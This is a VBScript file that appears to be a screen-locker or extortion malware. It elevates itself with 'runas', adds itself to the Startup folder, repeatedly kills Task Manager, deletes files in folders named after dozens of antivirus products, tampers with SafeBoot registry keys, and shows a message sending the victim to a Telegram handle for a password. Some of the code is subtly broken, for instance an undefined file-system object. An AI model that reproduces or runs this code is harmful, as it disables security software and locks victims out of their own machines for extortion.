Option Explicit

Dim objShell

Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "WScript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1

WScript.Sleep 500

Dim colProcesses, objWMIService, objFolder, objFile
Dim strFolder, arrAntivirusNames, strPassword, intAttempts

strFolder = "C:\"

arrAntivirusNames = Array("McAfee", "Norton AntiVirus", "Avast", "Bitdefender", "Kaspersky Anti-Virus", _
                          "AVG AntiVirus", "Trend Micro", "ESET NOD32", "Malwarebytes", "Sophos", _
                          "Avira", "Panda Security", "Webroot SecureAnywhere", "F-Secure", "BullGuard", _
                          "Comodo Antivirus", "VIPRE Advanced Security", "ZoneAlarm", "G Data", _
                          "Symantec Endpoint Protection", "Windows Defender", "Avast Free Antivirus", _
                          "Bitdefender Antivirus Plus", "Kaspersky Internet Security", "AVG Internet Security", _
                          "Trend Micro Maximum Security", "ESET Internet Security", "Malwarebytes Premium", _
                          "Avira Antivirus Pro", "Panda Dome Essential", "Webroot Antivirus", _
                          "F-Secure SAFE", "BullGuard Antivirus", "Comodo Internet Security", _
                          "VIPRE Antivirus Plus", "ZoneAlarm Pro Antivirus + Firewall", "G Data Internet Security", _
                          "Avast Premier", "Bitdefender Internet Security", "Kaspersky Total Security", _
                          "AVG Ultimate", "ESET Smart Security Premium", "Avira Prime", _
                          "Panda Dome Advanced", "Webroot Internet Security Plus", "F-Secure Internet Security", _
                          "BullGuard Internet Security", "Comodo Advanced Security", "Sophos Home", _
                          "Norton 360", "Dr.Web")

strPassword = "1122334400"
intAttempts = 2

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

Sub CloseTaskManager()
    objShell.Run "taskkill /f /im taskmgr.exe", 0, True
End Sub

Sub ShowMessage()
    objShell.Run "mshta.exe vbscript:msgbox(""If you want to know the password, please contact @TheBlackQuasar on Telegram"",64,""Message"")(window.close)"
End Sub

Sub RunInSafeMode()
    Dim regPath, regValue

    regPath = "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\MSIServer"
    regValue = "Service"

    objShell.RegWrite regPath, regValue, "REG_SZ"
    objShell.Run "regedit /s " & chr(34) & "path\to\antivirus_scan_safe_mode.reg" & chr(34), 0, True
End Sub

Sub CreateShortcut()
    Dim objShortcut, strStartupFolder

    strStartupFolder = objShell.SpecialFolders("Startup")
    Set objShortcut = objShell.CreateShortcut(strStartupFolder & "\MyScript.lnk")
    objShortcut.TargetPath = WScript.ScriptFullName
    objShortcut.Save
End Sub

If InStr(objShell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option"), "Minimal") > 0 Then
    RunInSafeMode
End If

CreateShortcut

Do While True
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='taskmgr.exe'")
    If colProcesses.Count > 0 Then
        CloseTaskManager
    End If
    WScript.Sleep(100)
    
    For Each strAntivirus In arrAntivirusNames
        If objFSO.FolderExists(strFolder & strAntivirus) Then
            Set objFolder = objFSO.GetFolder(strFolder & strAntivirus)
            For Each objFile In objFolder.Files
                objFile.Delete
            Next
        End If
    Next
    
    If objShell.AppActivate("Password Required") Then
        objShell.SendKeys strPassword
        WScript.Sleep(100)
        objShell.SendKeys "~"
        WScript.Quit
    End If
    
    If intAttempts = 2 Then
        ShowMessage
        intAttempts = intAttempts - 1
    End If
Loop